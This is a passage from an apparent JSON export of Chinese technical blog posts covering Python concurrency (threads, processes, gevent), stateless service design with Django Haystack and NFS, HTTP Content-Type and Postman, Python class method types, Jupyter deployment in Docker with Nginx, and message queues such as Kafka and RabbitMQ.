2.00 s end thread run 2.01 s end thread run 2.01 s end 由于线程中执行了 sleep ，释放了 CPU 资源，其他线程得以执行。如果新增注释部分的代码 my_thread.join()， 那么线程将串行执行：\nThread-101 Parent process 426. 0 thread run 2.01 s end Thread-102 Parent process 426. 2 thread run 4.01 s end Thread-103 Parent process 426. 4 thread run 6.02 s end 2.4 multiprocessing.dummy multiprocessing.dummy 模块与 multiprocessing 模块的区别： dummy 模块是多线程，而 multiprocessing 是多进程， 调用方式相同。\n1 2 from multiprocessing import Pool from multiprocessing.dummy import Pool 与 multiprocessing 类似，dummy 模块提供了多线程池，可以很方便将代码在多线程和多进程之间切换。dummy 模块在大量的开源项目中有所应用，十分推荐使用。\n3. 协程 协程是一种轻量级的线程。协程拥有独立的寄存器上下文和栈，同一个线程，共享堆。协程不由 OS 调度，OS 对于协程的一无所知，完全由程序员编码进行控制。\n具体点就是，执行函数 A 时，可以随时中断，去执行函数 B，接着中断 B ，继续执行函数A。而这些切换完全由程序吱声控制。协程调度实际上是在同一线程中，进行程序函数的切换，没有切换线程带来的开销。\n协程比较适合处理 IO 密集型的任务。\n3.1 Gevent Gevent 是第三方库，通过 Greenlet 实现协程，其基本实现原理是：\n当一个 Greenlet 遇到 IO 操作时，比如访问网络，就自动切换到其他的 Greenlet，等到 IO 操作完成，再在适当的时候切换回来继续执行。由于 IO 操作非常耗时，经常使程序处于等待状态，有了 Gevent 为我们自动切换协程，就保证总有Greenlet 在运行，而不是等待 IO。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import gevent import time, os, threading from gevent import monkey; monkey.patch_all() # 将默认阻塞的模块替换成非阻塞 start = time.time() def doubler(number): print(\u0026#39;Parent process %s.\u0026#39; % os.getpid()) print(number * 2) time.sleep(2) print(\u0026#39;run %0.2f s end\u0026#39;% (time.time() - start)) if __name__ == \u0026#39;__main__\u0026#39;: tasks=[gevent.spawn(doubler,i) for i in range(3)] # gevent.spawn 启动协程，参数为函数名称和参数名称 gevent.joinall(tasks) # gevent.joinall 等待执行完毕 Parent process 871. 0 Parent process 871. 2 Parent process 871. 4 run 2.00 s end run 2.00 s end run 2.00 s end 从结果来看，Python 中多线程和多协程的效果类似，在当前执行阻塞时，切换执行流程。不同的是，多线程切换的是线程，而协程切换的是正在执行的函数上下文。\n使用 Gevent，可以获得极高的并发性能，但 Gevent 只能在 Unix/Linux下运行，在 Windows 下不保证正常安装和运行。\n3.2 Django 在 Django 中也会使用 Gevent 来增强并发能力，特别是对于 IO 密集型的请求较多时：\n1 2 3 4 # 使用 uwsgi 部署 uwsgi --gevent 100 --gevent-monkey-patch --http :8000 -M --processes 4 --wsgi-file wsgi.py # 使用 gunicorn 部署 gunicorn --worker-class=gevent wsgi:application -b 0.0.0.0:8000 3.3 Celery Celery 支持几种并发模式，有 prefork，threading，协程（gevent，eventlet）。在 Celery 中使用并发模式，能显著提高处理效率，特别是 IO 操作较多时。\n1 celery worker -A celery_worker.celery -P gevent -c 10 -l INFO -P 选项指定 pool，默认是 prefork，这里指定为 gevent， -c 设置并发数。\n4. 最佳实践 IO 密集型的任务（例如，网络调用等）中使用线程和协程 CPU 密集的任务，需要使用多个进程，绕开 GIL 限制，充分利用多核 CPU ，提高效率 为了充分利用 CPU ，可以结合多进程+协程进行部署，多个进程，每个进程中多个协程。 5. 参考 http://xiaosheng.me/2017/04/01/article47/ http://yangcongchufang.com/%E9%AB%98%E7%BA%A7python%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/python-process-thread.html http://www.cnblogs.com/lxmhhy/p/6041001.html ","description":"","id":481,"section":"post","tags":["博文","Django","Demo","并发"],"title":"Python 中的进程、线程、协程","uri":"https://www.chenshaowen.com/blog/process-and-thread-in-python.html"},{"content":"1.问题描述 背景：一个 Django 开发的 SaaS 应用，对外提供文档服务功能。其中，搜索功能通过 Django Haystack 实现。\n问题：搜索功能有时可用，有时不可用。多次测试，发现可用和不可用会交替出现，出现概率各占约 50%。\n补充一下搜索功能实现的细节：\nDjango Haystack 在提供搜索功能之前，需要执行如下命令：\n1 python manage.py update_index 生成索引文件：\n1 2 3 _MAIN_1.toc MAIN_l4dclez7n5lsj047.seg MAIN_WRITELOCK 只有存在有效索引文件的前提下，才能提供搜索服务。因此，将更新索引的命令，通过 subprocess 在 Python 中直接执行，代码如下：\n1 2 3 cmd = \u0026#34;echo \u0026#39;y\u0026#39;| python manage.py update_index\u0026#34; subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() 2. 问题定位 发现服务的可用状态和不可用状态交替出现时，首先想到 Nginx 的默认负载策略就是轮询，交替将请求分配给不同负载。\n上面是 SaaS 部署的示意图。开发者将 SaaS，也就是图中 app server， 通过 Docker 进行部署。为了实现 app server 高可用，在部署时，PaaS 平台会自动实例化 SaaS 两次，保证两个 Docker 实例同时提供服务。在 app server 的前端，通过 Nginx 做负载均衡，分发用户请求，采用的是正是轮询策略。\n应该来说，定位十分准确了，接下来就是如何保证两个实例都进行了索引重建。但就是这个问题花费了不少时间。\n2.1 Django Once 代码 在 StackOverFlow 上，找到两种方法实现 Django 在启动时，仅执行一次的功能：\n利用顶层的 urls.py urls.py 模块仅会被导入并执行一次。\n1 2 3 4 from django.confs.urls.defaults import * from my_app import one_time_startup urlpatterns = ... one_time_startup() 利用 Django App 的 apps.py apps.py 文件可以配置一些 Django App 自定义的初始操作。\n1 2 3 4 5 6 7 # myapp/apps.py from django.apps import AppConfig class MyAppConfig(AppConfig): name = \u0026#39;myapp\u0026#39; verbose_name = \u0026#39;My Application\u0026#39; def ready(self): pass # one_time_startup code here 1 2 # myapp/__init__.py default_app_config = \u0026#39;myapp.apps.MyAppConfig\u0026#39; 在 one_time_startup() 函数中，实现索引重建的功能。\n按照部署逻辑分析，PaaS 平台实例化 app server 时，每个实例都会重建索引，搜索功能可用性应该为 100% ，同时在本地验证搜索功能正常。\n但是，实际上线之后，搜索服务并不可用。在部署日志里面，也没有重建索引的日志出现。似乎是 PaaS 平台禁止了在启动实例时，执行内置的一些命令。\n2.2 Django URL 访问重建索引 在实例 app server 时，不能重建索引文件，那么直接调用接口呢？\n1 2 3 4 5 # urls.py from django.conf.urls import include, patterns urlpatterns = patterns(\u0026#39;document.views\u0026#39;, (r\u0026#39;^build/$\u0026#39;, \u0026#39;build\u0026#39;), ) 1 2 3 4 5 6 # views.py import subprocess def build(request): cmd = \u0026#34;echo \u0026#39;y\u0026#39;| python manage.py update_index\u0026#34; subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() 于是，写了一个 url 接口，访问时，执行索引重建命令。在 SaaS 发布上线之后，连续访问两次，分别在两个实例更新索引。\n但这种方式，操作难度较大，不能保证两次访问之间，没有其他人访问。\n由于使用容器部署，每次部署时，之前部署的本地数据都会被销毁掉。因此，每次部署后都是全新的，只需要将重建索引的代码逻辑放在首页访问的 views 中，在执行重建索引之前添加一个判断。\n1 2 3 4 5 def article(request): if not os.path.exists(\u0026#39;索引文件\u0026#39;): pass # 重建索引 # 返回文档内容 按照分析，到这步，如果实例中没有索引文件，就重建；如果实例中有索引文件，则跳过重建。两实例中应该都有索引文件，搜索服务的可用性应该是 100% 。然而，并没有！\n为了节约 CPU 和内存资源，两台服务器上有数百个 app server 实例。每次重建索引都需要接近 20 秒的时间。\n在这 20 秒的时间内，如果有其他请求，因为索引正在创建，检测不到索引文件，又会触发一次重建索引。测试多次，发现搜索功能的可用性依然不是 100%，出现了一个比较奇怪的现象，有时可用，有时不可用，有时还会 500。初步怀疑是，由于连续触发重建索引，消耗大量服务资源出现服务不可以 500，同时，重建索引之前清除了索引，导致正在重建索引的实例搜索服务不可用。\n2.3 使用第三方服务 对于一个服务，有时可用，有时不可用，发布起来还特别繁琐易错，显然是不可接受的。于是，使用了 NFS 服务，可以看做是一个第三方的挂载目录服务。在实例化 app server 之后，将本地独享的 RES 目录挂载到 app server 实例容器中的 RES 目录上。最棒的是全部实例共享 RES 目录。\n配置非常简单，将 Haystack 的索引目录配置在 RES 目录中：\n1 2 3 4 5 6 HAYSTACK_CONNECTIONS = { \u0026#39;default\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;document.whoosh_cn_backend.WhooshEngine\u0026#39;, \u0026#39;PATH\u0026#39;: os.path.join(PROJECT_DIR, \u0026#39;RES\u0026#39;,\u0026#39;whoosh_index\u0026#39;), }, } 然后，在通过 URL 访问，执行索引重建命令：\n1 2 3 4 5 # urls.py from django.conf.urls import include, patterns urlpatterns = patterns(\u0026#39;document.views\u0026#39;, (r\u0026#39;^build/$\u0026#39;, \u0026#39;build\u0026#39;), ) 1 2 3 4 5 6 # views.py import subprocess def rebuild(request): cmd = \u0026#34;echo \u0026#39;y\u0026#39;| python manage.py update_index\u0026#34; subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() 2.4 小节 对于本地正常，但线上不能正常提供服务的异常定位，通常问题在部署上。\n了解部署流程和逻辑，对于 SaaS 开发十分重要，特别是依赖 PaaS 进行应用开发、测试、部署的人员。\n上面的例子，实际上是一个高可用与高一致性的矛盾。高可用意味着需要多个服务实例，而高一致性需要全部的服务实例数据一致。对于这类矛盾，解决办法就是将数据服务独立出来，上面的例子是通过挂载 NFS 服务来实现。\n尽量使用第三方服务，在 SaaS 中不要保持状态。\n3. 无状态 无状态是高并发设计的原则之一。如果服务实例不在本地存储持久化的数据，并且多个实例对于同一请求响应的结果是完全一致的，那么称这个服务是无状态的。\n一个无状态的服务，很容易的对其进行水平扩展。通过新增更多的实例，可以显著的提高服务的并发性能。\n如上图，对于有状态的服务，每个服务内部维护一个状态。\n而无状态服务只是把状态从服务中独立出来，共享状态。如上图，节点 A 与节点 B 提供相同的应用服务，同时共享状态。从而实现应用服务的生命周期与状态的生命周期解耦。如果状态服务，也就是数据服务高可用，那么所有的应用服务也都是高可用的。\n4. 参考 https://www.geekhub.cn/a/894.html ","description":"","id":482,"section":"post","tags":["博文","Django","服务","PaaS","SaaS"],"title":"无状态服务","uri":"https://www.chenshaowen.com/blog/stateless-service.html"},{"content":"1. HTTP Header HTTP 协议是建立在 TCP/IP 协议之上的应用层规范，以 ASCII 码传输。HTTP 规范把 HTTP 请求分为三个部分：状态行、请求头、消息主体。类似于下面这样：\n1 2 3 4 5 \u0026lt;method\u0026gt;\u0026lt;request-URL\u0026gt;\u0026lt;version\u0026gt; \u0026lt;headers\u0026gt; \u0026lt;entity-body\u0026gt; HTTP Header 包括通用头、请求头、响应头和实体头这四个部分。每个头域由一个头域的域名，冒号和域值组成。\n通用头部，是客户端和服务器都可以使用的头部，可以在客户端、服务器和其他应用程序之间提供一些非常有用的通用功能，如 Date 头部。\n请求头部，是请求报文特有的，为服务器提供了一些额外信息，比如客户端希望接收什么类型的数据，如 Accept 头部。\n响应头部，用于客户端提供信息，比如，客服端在与哪种类型的服务器进行交互，如 Server 头部。\n实体头部，指的是用于应对实体主体部分的头部，比如，可以用实体头部来说明实体主体部分的数据类型，如 Content-Type 头部。\n2. 文件请求和接口请求 通常的客户端与服务器的交互可以分为两类，一类是请求文件，html，js，css 等，另一类是接口数据请求。\n但是在 HTTP 请求的过程中，这两类处理方法是一样的。\n大多数浏览器限制 URL 长度在 2K 字节以内，而大多数服务最多处理 64K 大小的 URL。如果使用的是 GET 服务，在 body 里面传输数据，不同服务的处理方式也不同，有的可能会被处理，有的会被忽略。\nHTTP 协议规定 POST 提交的数据必须放在消息主体（entity-body）中，但协议并没有规定数据必须使用什么编码方式。服务器通常根据 HTTP Header 的实体头部中的 Content-Type 字段来获取请求中采用哪种编码，再对消息主体解析。\n3. 几种 Content-Type Content-Type 属性指定请求和响应的 HTTP 内容类型。\n常见的Content-Type：\ntext/html，html 文件类型 text/plain，文本类型 text/css，css 文件类型 text/javascript，javascript 文件类型 application/x-www-form-urlencoded multipart/form-data application/json application/xml 3.1 application/x-www-form-urlencoded POST 提交的数据按照 key1=val1\u0026amp;key2=val2 的方式进行编码，key 和 val 都进行 URL 转码。大部分服务端语言都对这种方式有很好的支持，浏览器的原生 form 表单就是按照这种方式提交。\n1 2 3 Content-Type: application/x-www-form-urlencoded;charset=utf-8 title=test\u0026amp;sub%5B%5D=1\u0026amp;sub%5B%5D=2\u0026amp;sub%5B%5D=3 3.2 multipart/form-data POST 提交的数据将被组织成 Key-Value 形式，用分隔符 boundary 处理成一条条消息。既可用于上传文件，也可以用于上传参数。将 form 表单的 form 设置为 multipart/form-data 时，按照这种方式提交。\n1 2 3 4 5 6 7 8 9 10 11 12 Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA ------WebKitFormBoundaryrGKCBY7qhFd3TrwA Content-Disposition: form-data; name=\u0026#34;text\u0026#34; title ------WebKitFormBoundaryrGKCBY7qhFd3TrwA Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;chrome.png\u0026#34; Content-Type: image/png PNG ... content of chrome.png ... ------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 3.3 raw 数据以纯文本形式（text/json/xml/html）进行编码，其中不含任何控件或格式字符。比较常见的 Content-Type 值有：application/json，text/xml ，text/plain等。\n1 2 3 Content-Type: application/json;charset=utf-8 {\u0026#34;title\u0026#34;:\u0026#34;test\u0026#34;,\u0026#34;sub\u0026#34;:[1,2,3]} 1 2 3 4 5 6 7 8 9 10 11 Content-Type: text/xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;examples.getStateName\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt;\u0026lt;i4\u0026gt;41\u0026lt;/i4\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; 4. Postman 作为一个跨平台的 API 测试工具，Postman 有 Win/Mac/Linux 客户端，还有 Chrome 扩展程序 。无论是前端、后台还是测试人员，都可以用 Postman 来测试接口，用起来非常方便。Postman 允许用户发送任何类型的 HTTP 请求，例如 GET、POST、HEAD、PUT、DELETE 等，并且可以允许任意的参数和 Headers。同时，支持不同的认证机制，包括 Basic Auth，Digest Auth，OAuth 1.0，OAuth 2.0，Hawk Authentication，AWS Signature 等，可以自动格式化响应数据，高亮显示。\n除此，Postman 还提供如下功能。\nDebugging and logs：可以在控制台对 Postman 的请求进行调试，特别是如果有 pre-request 或者 test script 时，使用控制台可以方便 debug。原生Postman 可以通过 CMD/CTRL + ALT + C 打开控制台。 Generate code snippets：将当前请求导出为各种版本的请求代码，比如 Python，js，curl等，方便用命令行测试。 Proxy：如果本机不能直接访问服务端，可以在Settings-Proxy-Using custom/system proxy设置代理。 Capturing HTTP requests：有时候用手机访问服务端时，我们可能需要借助 fiddler 来查看HTTP请求。Postman 也可以做相同的工作，只需要将Postman 作为代理转发HTTP请求即可。 Certificates： 如果服务端要验证客户端证书，可以在Settings-Certificates-Add Certificate配置证书。 pre-request script: 在发送请求之前执行的脚本，一般用来构建请求参数； test script: 在获取相应之后执行的脚本，一般用来做测试。不过需要注意，测试脚本运行在Sandbox环境，内置了许多JS库支持，方便进行测试。 Sharing collections：可以将Collection中的请求导出分享给其他人； Data formats：Postman可以导出环境变量，甚至可以将请求和环境变量等一起打包为一个Json，方便迁移所有的请求数据 Using environments in collection runs: 可以指定一个 Environment，这样collection中的请求可以使用其中的变量； Working with data files: 可以导入一个Data File，里面存放测试中用到的Data变量。可以存放很多不同的Data变量，这样迭代跑多次Collection时，每次使用不同的数据； Running multiple iterations: 可以配置迭代的运行Collection中的请求，对接口的稳定性进行测试。此外配合Data files，也可以对接口的正确性进行测试； Building workflows：默认情况下会顺序执行Collection中的请求，不过可以通过setNextRequest()来更改请求的执行流程。 Debugging a collection run: Collection中的请求执行后，会有可视化的执行结果展示，可以方便进行调试，此外，也可以通过控制台来进行调试。 Sharing a collection run: 整个Collection Run也是可以导出，可以在其他平台进行运行； Command line integration with Newman 导出Collection Run后，可以在命令行使用 newman 运行。 Integration with Travis CI: 可以将 newman 和 Travis CI集成，配置好持续性集成，指定自动运行测试用例的时机。 5. 参考 http://www.cnblogs.com/52fhy/p/5436673.html https://imququ.com/post/four-ways-to-post-data-in-http.html http://homeway.me/2015/07/19/understand-http-about-content-type/ ","description":"","id":483,"section":"post","tags":["博文","HTTP","接口"],"title":"HTTP Header 之 Content-Type","uri":"https://www.chenshaowen.com/blog/content-type-http-header.html"},{"content":"1. 函数方法 函数是组织好的，可重复使用的，用来实现单一或相关联功能的代码片段。函数能提高应用的模块性，代码的重复利用率。Python 提供了许多内建函数，比如 print()、str()。同时，Python 也允许用户创建函数，这被叫做自定义函数。\nPython 使用关键字 def 定义一个函数，依次写出函数名、括号、括号中的参数和冒号:，然后，在缩进块中编写函数体，函数的返回值用 return 语句返回。在 Python 类中定义的方法，称之为类函数方法。看个例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # coding:utf-8 class A(object): def instance_method(self): print(\u0026#34;类 {} 的实例方法\u0026#34;.format(A.__name__)) @staticmethod def static_method(): print(\u0026#34;静态方法\u0026#34;) @classmethod def class_method(cls): print(\u0026#34;类方法\u0026#34;) a = A() a.instance_method() A.static_method() a.class_method() A.class_method() 类 A 的实例方法 静态方法 类方法 类方法 上面具有函数名的函数，称之为命名函数。Python 也支持匿名函数，例如，lambda x: x * x。无论是命名函数，还是匿名函数，都是语句和表达式的集合。Python 函数和字符串、数字等一样，都是对象，拥有自己的一些属性，通过内置函数能查看这些属性。\n1 dir(a.instance_method) 2. 函数参数 2.1 fun(a,b,c) 直接将实参赋予形参，根据位置做匹配，即严格要求实参的数量与行参的数量位置相等，比较一般，大多数语言常用这种方式\n2.2 fun(a=1, b=2, c=3) 根据键值对的形式做实参与行参的匹配，通过这种式就可以忽略参数的位置关系，直接根据关键字来进行赋值，同时这种传参方式还有个好处就是可以在调用函数的时候，不要求参数数量上的相等，即可以 fun(3,4) 来调用函数，这里关键就是前面的 3,4 覆盖了原来 a、b 两个行参的值，但 c 还是不变采用原来的默认值 3，这种模式相较上面更加灵活，不仅可以通过 fun(c=5, a=2, b=7) 来打乱行参的位置，而且可以在但没有对应行参传递的时候常用定义函数时的默认值。\n2.3 fun(*args) 这传参方式是可以传入任意个参数，这些若干参数都被放到了 tuple 元组中赋值给行参 args，之后要在函数中使用这些行参，直接操作 args 这个 tuple 元组就可以了，这样的好处是在参数的数量上没有了限制，但是因为是 tuple，其本身还是有次序的，这就仍然存在一定的束缚，在对参数操作上也会有一些不便\n2.4 fun(**kargs) 最为灵活，其是以键值对字典的形式向函数传参，含有第二种位置的灵活的同时具有第三种方式的数量上的无限制。\n2.5 混合传参与实例 fun(arg1, arg2, *args , **kargs),但四种方式混用时要遵守：\n*args 须在 arg=value 之后 **kargs 须在 *args 之后 赋值过程为，按顺序把传给实参赋值给对应的行参，args = value 形式的实参赋值给行参，将多余出的实参打包组成一个tuple 传递给 *args，将多余的 key=value 形式的实参打包正一个 dicrionary 传递给 **kargs。 1 2 3 4 5 def arg_test(arg1, arg2, *args , **kargs): print(arg1) print(arg2) print(args) print(kargs) 1 arg_test(1,2) 1 2 () {} 1 arg_test(1,2,3) 1 2 (3,) {} 1 arg_test(1,2,3, a=4) 1 2 (3,) {'a': 4} 3. 函数方法 Python 类中提供了三种方法，实例方法（ instancemethod），静态方法（staticmethod） ，类方法（classmethod ）。当然，在 Python 中也可以通过 abc 模块中的 @abc.abstractmethod 声明抽象方法\n3.1 实例方法 定义时，第一个参数永远是 self。只能通过实例名.方法名调用，可以访问类属性、实例属性，类方法、实例方法、静态方法。\n实例方法和实例紧密相关，主要是用于改变、获取实例的状态，操作实例使用。\n使用场景：和实例对象相关的方法，比如，初始化、修改，获取实例对象属性等。\n1 2 3 4 5 class Date(object): def __init__(self, day=0, month=0, year=0): self.day = day self.month = month self.year = year 3.2 静态方法 没有任何必选参数，使用装饰器 staticmethod 修饰。可以通过实例名.方法名，也可以类名.方法名调用。不能访问实例属性和实例方法。\n静态方法不会访问 class 、object 本身 ，而仅仅只是一个函数。\n使用场景：属于类的方法，但是不会用到任何关于类的信息，比如，数据校验，算法等\n1 2 3 4 5 6 7 class Date(object): @staticmethod def is_date_valid(date_as_string): day, month, year = map(int, date_as_string.split(\u0026#39;-\u0026#39;)) return day \u0026lt;= 31 and month \u0026lt;= 12 and year \u0026lt;= 3999 is_date = Date.is_date_valid(\u0026#39;11-09-2012\u0026#39;) 3.3 类方法 定义时，第一个参数永远是 cls，使用装饰器 classmethod 修饰。可以通过实例名.方法名，也可以类名.方法名调用。\n其不能访问实例属性、实例方法，支持从特定格式的初始数据来创建对象。\n类方法不是绑定到实例对象，而是绑定到类。\n使用场景：用于创建类实例的工厂方法可以使用类方法\n1 2 3 4 5 6 7 8 9 10 11 12 class Date(object): def __init__(self, day=0, month=0, year=0): self.day = day self.month = month self.year = year @classmethod def from_string(cls, date_as_string): day, month, year = map(int, date_as_string.split(\u0026#39;-\u0026#39;)) date1 = cls(day, month, year) return date1 date2 = Date.from_string(\u0026#39;11-09-2012\u0026#39;) 4. 参考 https://stackoverflow.com/questions/12179271/meaning-of-classmethod-and-staticmethod-for-beginner ","description":"","id":484,"section":"post","tags":["博文","Python","规范","函数"],"title":"Python 的类函数方法","uri":"https://www.chenshaowen.com/blog/class-function-method-of-python.html"},{"content":"1. 简介 Jupyter Notebook（前称 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。\nJupyter Notebook 实际上是一个 Web 应用程序，可以创建和共享程序文档，支持实时代码，数学方程，可视化和 Markdown。 用途包括：数据清理和转换，数值模拟，统计建模，机器学习等。\n2. 本地安装 2.1 本地安装 推荐使用 Anaconda，自带 Numpy、Scipy、Matplotlib 等多种 Python 开发包和 Jupyter notebook。\n如果使用单独的 Python 解释器，则需要安装 Jupyter：\n1 pip install jupyter 2.2 本地运行 1 jupyter notebook 3. Docker 安装 Jupyter 官方提供了 base-notebook、minimal-notebook、all-spark-notebook、pyspark-notebook、scipy-notebook、datascience-notebook、tensorflow-notebook 以及 r-notebook 可选。根据自己的需要选择合适的镜像。\n3.1 安装 Docker 1 2 3 4 # CentOS 7 上安装 Docker yum install docker # 启动 docker 服务进程 service docker start 3.2 运行 Jupyter 1 2 3 4 5 6 7 8 9 10 11 docker run -d --name jupyter \\ -p 8888:8888 \\ --user root \\ -e GRANT_SUDO=yes \\ -e NB_UID=1000 \\ -e NB_GID=100 \\ -v /home/jupyter:/home/jovyan/work \\ jupyter/tensorflow-notebook start-notebook.sh \\ --NotebookApp.password=\u0026#39;sha1:080ffe3b42b2:f592d77b83d318bad8ee771ba44a51569af552d8\u0026#39; # 增加 NB_UID 对目录的权限 chown 1000 /home/jupyter 参数解释：\n\\ 表示换行，把一条命令拆成多行以方便阅读 -d 表示启动的容器进入到后台运行； -p 表示指定端口，这里把宿主机的 8888 端口映射到容器的 8888 端口； \u0026ndash;user=root，允许运行 sudo； -e 指定 jovyan 用户相关权限 ID； –name 表示给启动的容器设定名字; -v 表示把宿主机的目录挂载到容器中。Jupyter Docker 的文档目录是 /home/jovyan/work，为了使得容器被销毁时，文档不受影响，将本地目录 /home/local/jupyter 挂载到 /home/jovyan/work; -NotebookApp.password 是登录的密码，可以在 Ipython 中使用如下命令生成： 1 2 3 4 5 In [1]: from notebook.auth import passwd In [2]: passwd() Enter password: 123456 Verify password: 123456 Out[2]: \u0026#39;sha1:080ffe3b42b2:f592d77b83d318bad8ee771ba44a51569af552d8\u0026#39; 3.3 配置 Nginx 通过 nginx -t 命令找到 Nginx 的配置文件地址。在 nginx.conf 文件中，新增如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 upstream notebook { server localhost:8888; } server{ listen 80; server_name yourdomain.com; location / { proxy_pass http://notebook; proxy_set_header Host $host; } location ~ /api/kernels/ { proxy_pass http://notebook; proxy_set_header Host $host; # websocket support proxy_http_version 1.1; proxy_set_header Upgrade \u0026#34;websocket\u0026#34;; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_read_timeout 86400; } location ~ /terminals/ { proxy_pass http://notebook; proxy_set_header Host $host; # websocket support proxy_http_version 1.1; proxy_set_header Upgrade \u0026#34;websocket\u0026#34;; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_read_timeout 86400; } } 使用 nginx -s reload ，重启 Nginx 服务后生效。\n4. 使用 Jupyter 的基本单元是编程 cell 组成，也就是一个 In[ ]:\nJupyter 有三种类型的 cells：code，markdown cells，raw cells，常用的是 code cells 和 markdown cells 类型。\nCells 状态分为命令模式和编辑模式，Enter 进入编辑模式，ESC 进入命令模式，命令模式和编辑模式下支持很多操作快捷键。\n常用命令模式快捷键：\n1 2 3 4 5 6 7 8 - y: 单元进入代码状态 - m: 转入markdown状态 - r：转入raw状态 - a: 上方插入新单元 - b：下方插入新单元 - x：剪切选中单元 - c: 复制选中单元 - shift-v：粘贴到上方单元 插入 Markdown 直接输入 Markdown ，然后 Run 即可渲染结果。支持标题，文本，视频，图片等。\n插入 LaTeX 公式 创建行内公式\n1 $\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N$。 块级公式\n1 $x = \\dfrac{-b \\pm \\sqrt{b^2 - 4ac}}{2a} $$ 代码块 可以直接在页面输出代码块，只需要在前后加上```代码块 ```即可。\n嵌入图片 1 2 from IPython.display import Image Image(filename=\u0026#34;yourpath.jpg\u0026#34;) 嵌入音乐 可以嵌入本地音乐和网络音乐\n1 2 from IPython.display import Audio Audio(filename=\u0026#34;yourpath.wma\u0026#34;) 1 2 from IPython.display import Audio Audio(url=\u0026#34;http://yourpath.wma\u0026#34;) 嵌入本地视频 1 2 3 4 5 6 7 8 9 10 import io import base64 from IPython.display import HTML video = io.open(\u0026#39;/home/test.mp4\u0026#39;, \u0026#39;r+b\u0026#39;).read() encoded = base64.b64encode(video) HTML(data=\u0026#39;\u0026#39;\u0026#39;\u0026lt;video alt=\u0026#34;test\u0026#34; controls\u0026gt; \u0026lt;source src=\u0026#34;data:video/mp4;base64,{0}\u0026#34; type=\u0026#34;video/mp4\u0026#34; /\u0026gt; \u0026lt;/video\u0026gt;\u0026#39;\u0026#39;\u0026#39;.format(encoded.decode(\u0026#39;ascii\u0026#39;))) 嵌入网页 1 2 from IPython.display import IFrame IFrame(\u0026#39;http://yourpath.com\u0026#39;, width=\u0026#39;100%\u0026#39;, height=350) 嵌入链接 1 2 from IPython.display import FileLink FileLink(\u0026#39;./test/a.ipynb\u0026#39;) 魔法命令 所有以 % 开头的方法，都是所谓的魔术方法 (Magic function)，也就是 IPython 内置的一些方法。需要注意的是，魔术方法有%和 %% 之分，比如 %timeit 和 %% timeit。在 IPython 中有专门的叫法，前者叫 line magic 后者叫cell magic。顾名思义，前者是专门针对一行的命令，后者针对多行的命令。\n通过 %lsmagic可以查看所有的 magic 命令，使用 ? 或者 ?? 可以查看该命令的信息，后者可以查看源码。如： %alias?，会出现该方法的描述。\n5. 参考 https://github.com/jupyter/docker-stacks http://www.cnblogs.com/giserliu/p/4997144.html ","description":"","id":485,"section":"post","tags":["博文","工具","Python","笔记","Jupyter"],"title":"交互式笔记本-Jupyter","uri":"https://www.chenshaowen.com/blog/interactive-notebook-jupyter.html"},{"content":"1. 消息队列的适用场景 1.1 异步处理 应用场景：用户注册后，需要发注册邮件和注册短信。同步的处理方法，系统的性能（并发量，吞吐量，响应时间）会有瓶颈。\n1.2 应用解耦 应用场景：用户下单后，订单系统需要通知库存系统。传统的做法是，订单系统调用库存系统的接口，应用之间会有强依赖。采用消息队列下单后，订单系统写入消息队列就不再关心其他的后续操作，实现订单系统与库存系统的应用解耦。\n1.3 流量削锋 应用场景：秒杀活动，一般会因为流量过大，导致流量暴增，应用挂掉。采用消息队列后， 用户的请求，服务器接收后，首先写入消息队列，保证的服务的正常。\n1.4 消息驱动的系统 应用场景：在日志处理中，比如 Kafka 的应用，解决大量日志传输的问题\n2. 有哪些消息队列 Kafka 是 LinkedIn 开源的分布式发布-订阅消息系统，目前是 Apache 顶级项目。Kafka 主要特点是基于Pull 的模式来处理消息消费，追求高吞吐量，一开始的目的就是用于日志收集和传输。Kafka 不支持事务，对消息的重复、丢失、错误没有严格要求。内部采用消息的批量处理，zero-copy机制，数据的存储和获取是本地磁盘顺序批量操作，具有O(1) 的复杂度，消息处理的效率很高，适合产生大量数据的互联网服务的数据收集业务\nRabbitMQ 是基于 AMQP 协议实现，使用 Erlang 语言开发的开源消息队列系统。AMQP 协议多用于企业系统内，对数据一致性、稳定性和可靠性要求很高的场景。AMQP 的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。RabbitMQ 在吞吐量方面稍逊于 Kafka，d但支持对消息可靠的传递，支持事务，不支持批量的操作。\n3. RabbitMQ 与 Celery Celery 是一个异步的作业队列，没有消息存储功能。它的基本功能是管理分配任务到不同的服务器，并且取得结果。\n而 RabbitMQ 是一个消息代理。它的基本功能是接收并转发消息。因此，Celery 通常配合 RabbitMQ 使用，当然也可以使用 Redis、MongoDB 之类。\nRabbitMQ 中的一些基本概论：\nproducing 的意思是发送。一个发送消息的程序叫做 producer。\n一个 queue，即队列，相当于一个邮箱，它由 RabbitMQ 管理。尽管消息会在应用和 RabbitMQ 之间流过，但他们只被保存在队列中。队列没有边界限制，你想存多少消息就能存多少。它本质上是一个无限制的缓冲区。一个队列可以接收多个 producer 的消息，也可以被多个 consumer 